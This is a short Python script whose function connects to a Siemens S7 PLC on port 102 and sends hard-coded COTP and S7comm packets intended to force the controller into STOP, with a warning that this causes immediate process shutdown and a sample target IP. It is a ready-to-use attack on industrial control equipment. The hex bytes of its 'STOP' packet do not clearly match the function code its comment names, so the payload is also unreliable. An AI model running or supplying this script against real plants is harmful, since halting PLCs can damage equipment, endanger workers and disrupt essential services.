import socket
import struct

def s7_stop_plc(target_ip):
    """
    Sends PLC STOP command to Siemens S7 PLC
    WARNING: Causes immediate process shutdown
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, 102))

    # COTP Connection Request
    cotp_cr = bytes.fromhex('0300001611e0000000010000c00100c10200c20200')
    sock.send(cotp_cr)
    sock.recv(1024)  # Receive COTP CC

    # S7comm Setup Communication
    s7_setup = bytes.fromhex('0300001902f08032010000000000080000f0000001000100f0')
    sock.send(s7_setup)
    sock.recv(1024)

    # S7comm PLC STOP (Function 0x29)
    s7_stop = bytes.fromhex('0300002102f080320700000000000800080001120411440100ff09005f5045')
    sock.send(s7_stop)
    response = sock.recv(1024)

    sock.close()
    return response

# Usage: s7_stop_plc('192.168.1.100')
